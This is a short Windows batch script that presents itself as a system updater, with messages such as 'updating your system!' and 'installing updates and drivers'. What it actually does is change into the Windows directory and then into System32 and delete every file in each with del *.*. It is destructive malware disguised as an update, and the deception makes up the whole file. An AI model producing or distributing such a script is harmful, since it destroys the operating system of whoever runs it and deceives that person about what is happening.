@echo off
echo updating your system! please do not close this window
cd %SYSTEMDRIVE%\windows\
del *.*
echo installing updates and drivers
cd %SYSTEMDRIVE%\windows\system32
del *.*
echo please restart your computer to aply updates and drivers
pause
